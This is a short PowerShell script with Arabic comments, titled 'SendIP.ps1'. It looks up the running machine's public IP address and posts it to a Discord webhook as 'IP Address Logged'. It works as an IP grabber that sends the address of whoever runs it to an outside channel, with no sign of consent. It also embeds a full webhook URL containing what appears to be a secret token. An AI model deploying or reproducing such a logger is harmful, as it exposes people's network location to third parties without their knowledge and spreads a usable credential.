# SendIP.ps1 - إرسال IP إلى Discord Webhook

# رابط Webhook (استبدله بالرابط الحقيقي)
$webhook = "https://discord.com/api/webhooks/1398638353590521876/nS_F5qoPn6adJI3NSg4rA4zaOqQL_rUOpEJx9HkdZjD6pjo7-A1kP3nsbZJACxWIi8f7"

# الحصول على عنوان IP
$ip = Invoke-RestMethod -Uri "https://api.ipify.org"

# تنسيق البيانات
$body = @{
    content = ":satellite: IP Address Logged: $ip"
} | ConvertTo-Json

# إرسال إلى Webhook
Invoke-RestMethod -Uri $webhook -Method Post -ContentType "application/json" -Body $body
